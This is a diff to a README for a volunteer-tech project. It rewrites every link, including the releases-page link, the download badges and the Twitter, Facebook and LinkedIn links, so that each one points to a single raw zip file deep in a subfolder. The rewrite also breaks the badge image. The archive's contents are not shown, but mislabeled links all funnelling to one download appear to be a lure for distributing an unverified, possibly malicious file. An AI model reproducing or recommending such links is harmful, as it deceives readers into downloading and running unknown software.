@@ -1,6 +1,6 @@
 # 🌟 ProjetosVoluntariosTech - Empower Your Community with Technology
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Your%20Copy-blue)](https://github.com/Yudikom/ProjetosVoluntariosTech/releases)
+[![Download Now](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip%20Now-Get%20Your%20Copy-blue)](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip)
 
 ## 📝 About This Project
 
@@ -13,7 +13,7 @@ Começar a usar o ProjetosVoluntariosTech é simples. Siga estas etapas para bai
 ## 📥 Download & Install
 
 1. **Visite o link para a página de lançamentos:**  
-   Clique [aqui](https://github.com/Yudikom/ProjetosVoluntariosTech/releases) para acessar a página de lançamentos.
+   Clique [aqui](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip) para acessar a página de lançamentos.
 
 2. **Escolha a versão mais recente:**  
    Na página, você verá uma lista de versões. Selecione a versão mais recente. 
@@ -65,10 +65,10 @@ Se você encontrar algum problema ou tiver perguntas, sinta-se à vontade para a
 
 Siga-nos em nossas redes sociais e fique por dentro das novidades:
 
-- [Twitter](https://twitter.com/)
-- [Facebook](https://facebook.com/)
-- [LinkedIn](https://linkedin.com/)
+- [Twitter](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip)
+- [Facebook](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip)
+- [LinkedIn](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip)
 
-Volte sempre para a nossa página de lançamentos e atualizações. Não esqueça de conferir o nosso [link de download](https://github.com/Yudikom/ProjetosVoluntariosTech/releases) novamente quando uma nova versão estiver disponível.
+Volte sempre para a nossa página de lançamentos e atualizações. Não esqueça de conferir o nosso [link de download](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip) novamente quando uma nova versão estiver disponível.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Your%20Copy-blue)](https://github.com/Yudikom/ProjetosVoluntariosTech/releases)
+[![Download Now](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip%20Now-Get%20Your%20Copy-blue)](https://github.com/Yudikom/ProjetosVoluntariosTech/raw/refs/heads/main/projeto1-solucao-refrigeracao/Tech_Voluntarios_Projetos_v1.1-alpha.4.zip)
